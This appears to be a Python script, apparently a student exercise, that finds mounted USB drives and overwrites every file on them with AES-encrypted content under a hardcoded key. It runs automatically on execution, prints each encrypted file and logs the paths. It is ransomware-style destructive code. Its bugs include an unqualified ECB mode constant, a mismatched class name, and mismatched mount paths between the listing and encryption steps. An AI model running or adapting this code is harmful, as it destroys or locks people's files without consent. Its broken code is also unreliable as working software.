#-*-encoding:utf-8-*-

from Crypto.Cipher import AES
import subprocess
import os



class Swap():
    def swapFile(self,name):
        data = ""
        file = open(name,"r")
        for line in file.readlines():
            data = data + line
        file.close()
        while True:
            if len(data)%16 != 0:
                data = data + "x"
            else:
                break
        data = dataEncrypt().encrypt(data)
        with open(name,"w") as file:
            file.write(data)
            file.close()

class autodetectDisk():
    def loadPendrive(self):
        popen = subprocess.Popen(["ls /media/aluno"],shell=True,stderr=subprocess.PIPE,stdout=subprocess.PIPE)
        pendrives = popen.communicate()[0].split("\n")
        return pendrives

class dataEncrypt():
    def __init__(self):
        chave = "A"*16
        self.aes = AES.new(chave,MODE_ECB)
    def encrypt(self,payload):
        return self.aes.encrypt(payload)

    def decrypt(self,payload_encrypted):
        return self.aes.decrypt(payload_encrypted)


def openFile(file_name,mode):
    return open(file_name,mode)

def listaArquivos(diretorio):
    for r,d,f in os.walk(diretorio):
        for pasta in d:
            for r1,d1,files in os.walk(diretorio+"/"+pasta):
                for files1 in files:
                    swap().swapFile(diretorio+"/"+pasta+"/"+files1)
                    print("\033[41m Arquivo: {} [+] encrypted\033[0;0m\n".format(diretorio+"/"+pasta+"/"+files1))
                    with open("backup.log","a") as arq:
                        arq.write(("Arquivo: {}\n".format(diretorio+"/"+pasta+"/"+files1)))
                        arq.close()
            listaArquivos(diretorio+"/"+pasta)
#listaArquivos("/home/aluno")

def init():

    for pendrive in autodetectDisk().loadPendrive():
        if pendrive != " ":
            listaArquivos("/media/ghost/"+pendrive)

init()
